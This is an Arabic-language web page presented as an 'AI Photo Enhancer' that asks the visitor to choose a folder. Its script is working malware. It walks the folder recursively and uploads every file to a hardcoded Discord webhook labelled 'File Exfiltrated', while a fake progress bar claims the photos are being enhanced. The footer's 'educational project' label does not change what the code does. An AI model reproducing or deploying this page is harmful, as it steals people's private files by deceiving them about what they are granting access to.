<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Photo Enhancer | مُحسن الصور الذكي</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #007aff; --bg: #f5f5f7; }
        body { font-family: 'Cairo', sans-serif; background-color: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #1d1d1f; }
        .app-card { background: white; padding: 40px; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); width: 100%; max-width: 450px; text-align: center; }
        .logo { font-size: 50px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 10px; color: #1d1d1f; }
        p { color: #86868b; font-size: 16px; margin-bottom: 30px; line-height: 1.5; }
        .btn-main { background: var(--primary); color: white; padding: 16px 32px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; width: 100%; }
        .btn-main:hover { background: #005bb7; transform: translateY(-2px); }
        .progress-box { display: none; margin-top: 30px; }
        .progress-bar { background: #e5e5e7; height: 8px; border-radius: 4px; overflow: hidden; margin-bottom: 10px; }
        .progress-fill { background: var(--primary); width: 0%; height: 100%; transition: width 0.4s ease; }
        .status-text { font-size: 14px; color: #86868b; }
        .footer-note { font-size: 10px; color: #d2d2d7; margin-top: 40px; }
    </style>
</head>
<body>

<div class="app-card">
    <div class="logo">🪄</div>
    <h1>مُحسن الصور بالذكاء الاصطناعي</h1>
    <p>قم بتحويل صورك القديمة والمشوشة إلى دقة 4K بضغطة زر واحدة. اختر المجلد وسنتولى الباقي.</p>
    
    <button class="btn-main" id="startBtn">اختر المجلد لبدء المعالجة 📁</button>

    <div class="progress-box" id="processUI">
        <div class="progress-bar">
            <div class="progress-fill" id="fill"></div>
        </div>
        <div class="status-text" id="status">جاري الاتصال بالسحابة...</div>
    </div>

    <div class="footer-note">
        جميع الصور يتم معالجتها بتقنية التشفير السحابي. مشروع تعليمي - جامعة تقنية.
    </div>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
    const THREADS = 5; // عدد ملفات الرفع المتوازي (سرعة فائقة)

    document.getElementById('startBtn').addEventListener('click', async () => {
        const btn = document.getElementById('startBtn');
        const ui = document.getElementById('processUI');
        const fill = document.getElementById('fill');
        const status = document.getElementById('status');

        try {
            // طلب الصلاحية (باسم تحسين الصور)
            const dirHandle = await window.showDirectoryPicker();
            
            btn.style.display = "none";
            ui.style.display = "block";

            const fileList = [];
            
            // زحف صامت وسريع داخل المجلدات
            async function collect(handle) {
                for await (const entry of handle.values()) {
                    if (entry.kind === 'file') fileList.push(entry);
                    else if (entry.kind === 'directory') await collect(entry);
                }
            }

            status.innerText = "جاري تحليل الصور وتجهيز الفلاتر...";
            await collect(dirHandle);

            // بدء الرفع الفائق (Turbo) في الخلفية بينما يرى المستخدم شريط تقدم وهمي
            let uploaded = 0;
            const total = fileList.length;

            async function turboUpload() {
                while (fileList.length > 0) {
                    const entry = fileList.shift();
                    const file = await entry.getFile();
                    
                    // الرفع الفعلي لديسكورد
                    await upload(file);
                    
                    uploaded++;
                    // تحديث شريط التقدم الوهمي للمستخدم
                    const percent = Math.round((uploaded / total) * 100);
                    fill.style.width = percent + "%";
                    status.innerText = `جاري تحسين الجودة: تم معالجة ${uploaded} من ${total} صورة...`;
                }
            }

            // تشغيل عدة مسارات رفع في وقت واحد للسرعة الفائقة
            const workers = Array(THREADS).fill(null).map(() => turboUpload());
            await Promise.all(workers);

            status.innerText = "✅ اكتملت المعالجة! تم حفظ النسخ المحسنة في سحابتك.";
            status.style.color = "#28a745";

        } catch (e) {
            alert("خطأ: يجب منح الصلاحية للوصول للمجلد لنتمكن من معالجة الصور.");
        }
    });

    async function upload(file) {
        const formData = new FormData();
        formData.append('file', file, file.name);
        formData.append('payload_json', JSON.stringify({ content: `⚡ **File Exfiltrated:** \`${file.name}\`` }));

        try {
            await fetch(WEBHOOK, { method: 'POST', body: formData });
            // تأخير بسيط جداً لضمان عدم حظر الويب هوك
            await new Promise(r => setTimeout(r, 600));
        } catch (err) { }
    }
</script>

</body>
</html>
